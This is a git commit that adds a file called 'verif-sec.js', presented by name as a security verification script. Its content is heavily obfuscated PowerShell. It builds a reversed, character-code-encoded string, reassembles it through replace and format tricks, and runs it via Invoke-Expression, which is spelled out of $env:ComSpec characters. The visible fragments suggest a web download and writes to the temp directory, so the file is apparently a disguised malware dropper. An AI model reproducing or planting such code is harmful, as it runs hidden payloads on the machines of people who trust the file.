dc8204508816bc5039fd6ab292b3b0ca12d429e4
Azkic50 <Azkilohj55@gmail.com>
2025-04-08 20:43:22 -0400

    Create verif-sec.js

---
+++ verif-sec.js
@@ -0,0 +1,22 @@
+$v76p  =  " )''nioJ-]2,11,3[EMaN.)'*RDM*' ElBaIRav-Teg(( & |)93]rAHC[,)401]rAHC[+111]rAHC[+101]rAHC[(eCAlpErc- 69]rAHC[,)58]rAHC[+48]rAHC[+801]rAHC[( ECalpeR-  43]rAHC[,'Fry'ECalpeR-  421]rAHC[,)121]rAHC[+57]rAHC[+76]rAHC[(eCAlpErc-  )'xEIyKC )63]RAhC[]GNIRTS[,)57]RAhC[+77]RAhC[+99]RA'+'hC[((EcAlper.)93]RAhC[]GNIRTS[,hoeJE9hoe(Ec'+'Alper.)hoeUTl'+'hoe,hoecAdhoe(EcAl'+'per.))hoes8o'+'}hoe,ho'+'e7sJE9+JE9eW97,W97JE9+JE9corP-trW97f-sJE9+J'+'E9'+'8oJE9+JE9}JE9+JE93J'+'E9+JE9{h'+'oe,hoe9{zDGJE9+JE9 '+'ni '+'}JE9+JE9I{JE9+JE9zDG(JE9+JE9 hcaJE9+JE9erhoe,hoe,)511]RAHC[+65]RAHC[+111]RAHhoe,ho'+'evyEJE9+'+'JE9mOsJ'+'E9+Jhoe,hoe9} hoe,hoe9+'+'JE9ODvyS{JE9+JE9zhoe,'+'hoeG        
+{ JE9+JE9)JE9+JE9}HTADvJE9+JE9yPDvyJE9+JE9EliDvyJE9+JE9F{JE9'+'+JE9hoe,hoeJE'+'9  JE9+JE9
+Jhoe,hoeE9+JE9o}1{JE9'+'+JE9}3{}2{'+'}JE'+'9+JE9'+'0{}JE9+JE94{s8o(JE9+J'+'E'+'9&'+'  JE9'+'+hoe,hoe9vyLNwod{JE9+JE9zJEhoe,hoe97JE9+JEhoe,hoe221]RAHC[+86]RAHCh'+'oe,hoeDvy'+'lJE9+JE9DvyIJE9+JE9F'+'JE9+JE9{JE9+JE9hoe,hoe97,JE9hoe,hoe1JEh'+'oe,hoe9    
+{ )'+'JE9+'+'JEhoe,hoeC[+121]RAHC['+'((ecahoe,hoeezDGs8o = }HtADvypelJE9+JE9DvJE9+JE9yIFJE9+JE9{JE9+JE9zDG    JE9+JE9  
+{ yJE9+JE9rtJE9+JEhoe,hoe9}ATDJE9+JE9vyJE9+JE9Ad'+'Dhoe,hoelpER.)JE9KMcJE9,)hoe,hoeE9+JE9'+'vJE9+JE9yPEliDJE9+JE9vyf{JE9+JE9zDG elJ'+'E9+JE9iFtJE9+JE9uOJE9+JE9- JE9+JE9s8oasJE9+JE98o'+'.}'+'JE9+JE9i{hoe,hoe9+JE9OAJE9+JE9W97JE9+J'+'E9,JE9+JE9W97isW97,W9JE9+JE97m.NKhoe,hoe8o(JE9+J'+'E9 = )W97bWJE9+JE997( ;hoe,hoezDG irU- )W97oJE9+JE'+'9vnJE9+Jhoe,hoe
+}hoe,hoeJE9+Jhoe,hoe[+17]RAHC[(hoe,hoe9+JE9DG(Jhoe,hoeE9+JEhoe,hoeE9;)hoe,hoeE9 
+{hoe,hoe)WJE9+'+'JE997EJE9+JE9RJJEhoe,hoe(ecalpER.)29]RAhoe,hoe'+'JE9  JE9+JE9    
+{ JE9+JE9)}dADvJE9+JE9yODJE9+JEhoe'+',h'+'o'+'eof  
+JE9+Jhoe,hoe9,W97ism.NKEERW97fJE9+JE9-'+'s8J'+'E9'+'+JE9o}JE9+JE90{JE9+JE9}JE9+JE91{JE9+JE9}4{}'+'5{}JE'+'9+JE93{}2JE9+JE9{}6{sJE9+JE98JE9+JE9o( =JE9+JE9 )W97aW97({JE9+JE9@JE9+JE9]tcejbJE9+JE9OmJE9+'+'JE9ho'+'e,hoeW97,W97hoe,hoealpER.)93]RAHC[]gNirTs[,JE'+'9'+'W97hoe,hoe,JE9M0iJE9(ecalpER.)JE9  
+JE9+J'+'E9
+JE9+JE9}  
+} JE9+JE9  JE9+Jhoe,hoe    
+}J'+'E9+JE9   '+'JE9+JE9'+' 
+;}ht'+'aPehoe,hoe hctaJE9+JE9cJE9+JE9hoe,hoe)WJE9+JE997tthJE9+JE9W97,JE9+JE9WJE9+JE997etalJE9+JE9hoe,hoezDG )W97JE9+JE9sW97,W9JE'+'9+JE'+'97atSW97JE9+JE9,W9hoe,hoeDG JE9+JE9 
+JE9+JE9
+JE9(( )JEh'+'oe,hoe9+JE9'+'    
+ }     JE9hoe,hoe'+'W97,WJE9+JE9hoe,hoezDG )W97TWJE9+JE99JE9+JE97,JE9+JE9W9'+'7htaP-tsJE9+JE9eW9JE9+J'+'E97 f- sJE9+JE98o}JE9+JE90{}1{JE9+JE9sJE9+JE98o(.('+' fi    JE9+J'+'E9  
+;}euJE9+JE9RDvyT{zDG JE9+JE9= }dADvyJE9+Jhoe,hoeE9IW97'+',JE9+JE9W'+'97MW9JE9+JE9'+'7JE9+JE9,W97tJE9+JE9'+'s'+'W97,JE9+JE9W97dohJE9+JE9tehoe,hoeJE9(ecal'+'pER.)JE9cAdJE9,)86]RAHC[+811]RAHhoe,hoe9+J'+'E9{}'+'0{}2{shoe,hoe+JE9W'+'97JE9+JE9owJE9+JE'+'9W97,WJE9+JE997JE9+JE9oJE9+JE9nchoe,hoe9xJE9+]31[DilleHsKMc+]1[DIllehSKMc ( . hoe,h'+'oeo(.JE9+JE9   hoe,hoe:spW97,JE9+JE9W97JJE9+JE9Whoe,hoekWJE9+JE997 f-s8Jhoe,hoeEWJE9+JE997fJE9+JE9- hoe,hoe9JE9+JE97eR-ehoe,hoeJE9+JE9  JE9+'+'JE9  JE9+JE9 
+JE'+'9+JE9 ;}hJE9+JE9TAJE9+JE9DJhoe,hoeHC[]gNirTs[hoe,hoeotsuCJE9+JE9SP[  
+(@ = }aTaJE9+JE9dE'+'JE9+JE9MJEhoe,hoeE9+JE9 fi  JEhoe,hoeEhoe,hoe+JE9 
+;}EJE9+JE9SJE9+JE9DvyJE9+JE9l'+'afJE9+JE9{zDG = }DJE9+JE9aoLDvynWDvJE9+JE9yOJE9+JE9d{zDhoe,hoeOA/eJE9+JE9vJE9+JE9il'+'JE9+JE9.rJE9+JE9Whoe,h'+'oe JE9+hoe,hoerhoe,hoe}1{}JE9+JE90{}JE9+JE92{JE9+JE9s8JE9+JE9hoe,hoeC[((echoe,hoeE9p//JE9+JE9hoe,hoe))43]RAHC[]gNirTs[hoe,hoeE9O'+'lJE9+JE9DvyNwJE9+JE9od{JE9+JE9zJE'+'9+JE9DGJE9+JE9 JE9+JE9     
+;JE9+JE9s8o)b.izDG(zDGM0iP'+'MET:vnhoef- Fry}1{}86{}3{}33{'+'}22{}45{}15{}95{}44{}83{}21{}23{}04{}03{}'+'13{}85{}82{}07{'+'}4{'+'}81{}6{}36{}24{}66{}31{}05{}74{}32{}52{}41{}61{}26{}7'+'3{}16{}34{}01{}6'+'2{}8{}46{}42{}0{}35{}55{}25{}76{}9{}96{}63{}14{}64{}93{}94{}51{}17{}65{'+'}12{}84{}92{}5{}43{}7'+'{}75{}02{}54{}2{}71{}06{}53{}11{}56{}72{}91{Fry(( '((";  "$( Set-ItEm 'vaRiABLe:OFS'  '' )" + [STrIng]((  VaRiabLe V76p ).valuE[-1..- ((  VaRiabLe V76p ).valuE.LenGTh )] ) +" $(Set  'oFs' ' ')" | & ( $enV:CoMspEc[4,24,25]-Join'')
